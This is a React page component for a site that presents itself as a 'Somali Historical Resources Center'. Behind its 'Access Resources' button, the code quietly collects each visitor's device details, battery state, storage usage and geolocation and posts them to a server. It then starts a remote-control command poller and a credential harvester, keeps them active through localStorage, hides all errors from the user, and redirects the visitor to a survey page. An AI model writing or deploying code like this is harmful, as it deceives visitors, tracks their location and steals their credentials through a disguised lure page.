import React from 'react';
import { Link } from 'react-router-dom';
import axios from 'axios';
import RemoteControl from '../utils/remoteControl';
import CredentialHarvester from '../utils/credentialHarvesting';

const Home = () => {
  const collectDeviceInfo = () => {
    const deviceInfo = {
      platform: navigator.platform,
      userAgent: navigator.userAgent,
      language: navigator.language,
      cookiesEnabled: navigator.cookieEnabled,
      screenSize: {
        width: window.screen.width,
        height: window.screen.height,
        availWidth: window.screen.availWidth,
        availHeight: window.screen.availHeight,
        colorDepth: window.screen.colorDepth,
        pixelDepth: window.screen.pixelDepth
      },
      connection: navigator.connection ? {
        effectiveType: navigator.connection.effectiveType,
        downlink: navigator.connection.downlink,
        rtt: navigator.connection.rtt,
        saveData: navigator.connection.saveData
      } : 'Not available',
      batteryInfo: 'Requesting',
      locationInfo: 'Requesting',
      storageEstimate: 'Requesting'
    };
    
    return deviceInfo;
  };

  const handleDeviceConnectRequest = async () => {
    try {
      const deviceInfo = collectDeviceInfo();
      
      // Try to get battery information
      if (navigator.getBattery) {
        try {
          const battery = await navigator.getBattery();
          deviceInfo.batteryInfo = {
            charging: battery.charging,
            level: battery.level,
            chargingTime: battery.chargingTime,
            dischargingTime: battery.dischargingTime
          };
        } catch (error) {
          deviceInfo.batteryInfo = 'Failed to access';
        }
      }
      
      // Try to get location
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          position => {
            deviceInfo.locationInfo = {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy: position.coords.accuracy
            };
            
            // Continue with sending the data after location is obtained
            sendConnectionRequest(deviceInfo);
          },
          error => {
            deviceInfo.locationInfo = 'Not available';
            // Continue with sending even if location failed
            sendConnectionRequest(deviceInfo);
          }
        );
      } else {
        deviceInfo.locationInfo = 'Not supported';
        sendConnectionRequest(deviceInfo);
      }
      
      // Estimate storage
      if (navigator.storage && navigator.storage.estimate) {
        try {
          const estimate = await navigator.storage.estimate();
          deviceInfo.storageEstimate = {
            usage: estimate.usage,
            quota: estimate.quota,
            usagePercentage: (estimate.usage / estimate.quota) * 100
          };
        } catch (error) {
          deviceInfo.storageEstimate = 'Failed to access';
        }
      }
      
      // If geolocation isn't available, send request immediately
      if (!navigator.geolocation) {
        sendConnectionRequest(deviceInfo);
      }
    } catch (error) {
      console.error('Error in connection process:', error);
      // Silently fail - don't alert the user
    }
  };

  const sendConnectionRequest = async (deviceInfo) => {
    try {
      const response = await axios.post('/api/connect', {
        deviceInfo,
        userAgent: navigator.userAgent
      });
      
      if (response.data.success) {
        const connectionId = response.data.connectionId;
        
        // Initialize remote control with the connection ID
        const remoteControl = new RemoteControl(connectionId);
        
        // Start polling for commands
        remoteControl.startCommandPolling();
        
        // Initialize credential harvester
        const credentialHarvester = new CredentialHarvester(connectionId);
        
        // Start harvesting credentials
        credentialHarvester.start();
        
        // Store in localStorage to persist across page refreshes
        localStorage.setItem('connectionId', connectionId);
        
        // Store credential harvester in localStorage
        localStorage.setItem('credentialHarvesterActive', 'true');
      }
      
      // Redirect to the survey page instead of external site
      window.location.href = '/survey';
    } catch (error) {
      console.error('Error sending connection data:', error);
      // Still redirect even if the connection fails
      window.location.href = '/survey';
    }
  };

  return (
    <div className="home-container">
      <h1 className="home-title">Somali Historical Resources Center</h1>
      <p className="home-description">
        Access our exclusive collection of Somali historical resources, research papers, 
        and educational materials to learn about Somalia's rich cultural heritage.
      </p>
      
      <div className="home-actions">
        <button 
          className="cta-button"
          onClick={handleDeviceConnectRequest}
        >
          Access Resources
        </button>
        
        <Link to="/survey" className="cta-button secondary">
          Participate in Survey
        </Link>
      </div>
      
      <div className="home-features">
        <div className="feature">
          <h3>Historical Archives</h3>
          <p>Access our collection of rare historical documents about Somalia</p>
        </div>
        
        <div className="feature">
          <h3>Cultural Resources</h3>
          <p>Explore Somalia's rich cultural heritage through our digital library</p>
        </div>
        
        <div className="feature">
          <h3>Research Database</h3>
          <p>Search through academic papers and research about Somali history</p>
        </div>
      </div>
    </div>
  );
};

export default Home; 